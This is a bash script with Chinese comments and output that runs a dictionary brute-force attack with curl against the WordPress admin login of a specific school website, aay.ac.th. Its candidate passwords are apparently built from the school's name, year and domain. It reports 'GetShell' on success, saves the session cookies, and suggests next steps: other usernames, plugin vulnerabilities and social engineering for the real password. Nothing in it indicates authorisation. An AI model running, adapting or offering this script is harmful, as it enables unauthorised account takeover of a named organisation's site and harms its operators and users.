#!/bin/bash
TARGET="https://aay.ac.th"
USER="admin"
DICT="smart_passwords.txt"
TOTAL=$(wc -l < $DICT)

echo "╔════════════════════════════════════════════════════════╗"
echo "║     智能密码字典爆破 - aay.ac.th                      ║"
echo "╚════════════════════════════════════════════════════════╝"
echo
echo "[+] 目标: $TARGET"
echo "[+] 用户: $USER"
echo "[+] 字典: $DICT ($TOTAL 个密码)"
echo "[+] 基于信息: 学校名称、年份、域名等"
echo "[+] 开始时间: $(date)"
echo
echo "═══════════════════════════════════════════════════════"
echo

count=0
success=0

while IFS= read -r pass; do
    count=$((count + 1))
    
    # 每50个显示一次进度
    if [ $((count % 50)) -eq 0 ]; then
        percent=$((count * 100 / TOTAL))
        echo "[进度] $count/$TOTAL ($percent%) - 最后测试: $pass"
    fi
    
    # 获取初始cookie
    curl -sk "$TARGET/wp-login.php" -c /tmp/wp_init.txt -o /dev/null 2>&1
    
    # 提交登录
    RESPONSE=$(curl -sk "$TARGET/wp-login.php" \
        -X POST \
        -b /tmp/wp_init.txt \
        -c /tmp/wp_result.txt \
        -d "log=$USER&pwd=$pass&wp-submit=Log+In&testcookie=1" \
        -D /tmp/wp_headers.txt \
        -o /tmp/wp_body.html \
        -w "%{http_code}" \
        2>&1)
    
    # 判断成功（4重验证）
    if [ "$RESPONSE" = "302" ]; then
        if grep -qi "Location:.*wp-admin" /tmp/wp_headers.txt; then
            if grep -qi "wordpress_logged_in" /tmp/wp_result.txt; then
                echo
                echo "╔════════════════════════════════════════════════════════╗"
                echo "║           🎯 GetShell 成功！                          ║"
                echo "╚════════════════════════════════════════════════════════╝"
                echo
                echo "用户名: $USER"
                echo "密码: $pass"
                echo "尝试次数: $count/$TOTAL"
                echo "登录URL: $TARGET/wp-login.php"
                echo "后台URL: $TARGET/wp-admin/"
                echo
                echo "Cookie已保存: /tmp/wp_result.txt"
                echo "响应头保存: /tmp/wp_headers.txt"
                echo
                echo "[+] 验证登录:"
                curl -sk "$TARGET/wp-admin/" -b /tmp/wp_result.txt | grep -qi "dashboard" && echo "✅ Dashboard可访问"
                echo
                exit 0
            fi
        fi
    fi
    
    # 检查是否密码错误（继续测试）
    if ! grep -qi "login_error\|incorrect" /tmp/wp_body.html; then
        # 非标准错误，可能是其他问题
        echo "[!] 异常响应 (HTTP $RESPONSE) 密码: $pass"
        echo "    响应已保存: wp_suspicious_$count.html"
        cp /tmp/wp_body.html "wp_suspicious_$count.html"
    fi
    
    # 速率控制（每个密码间隔1秒）
    sleep 1
    
done < "$DICT"

echo
echo "═══════════════════════════════════════════════════════"
echo
echo "❌ 测试完成，未找到有效密码"
echo "测试总数: $count 个密码"
echo "用时: $((count * 1)) 秒 (约 $((count / 60)) 分钟)"
echo
echo "建议:"
echo "1. 扩展密码字典（加入更多变体）"
echo "2. 尝试其他用户名: aay-editor"
echo "3. 寻找WordPress插件漏洞"
echo "4. 社工获取真实密码"
